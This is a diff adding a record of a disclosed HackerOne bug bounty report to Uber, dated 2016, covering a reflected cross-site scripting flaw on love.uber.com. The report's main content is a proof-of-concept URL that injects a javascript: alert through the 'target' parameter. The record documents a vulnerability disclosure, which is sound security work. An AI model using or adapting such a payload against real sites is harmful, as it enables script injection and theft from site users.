@@ -1,0 +1,16 @@
+ReportLink:https://hackerone.com/reports/125179
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/laps-forever
+ReportedTo:Uber(uber)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:09.05.2016 22:34:39
+
+Summary:
+
+Hi, here is an XSS vector on love.uber.com
+
+https://love.uber.com/australia/?icl_action=reminder_popup&target=javascript%3aalert%28%2ftest%2f%29%3b%2f%2f
+
+Anatoly Ivanov
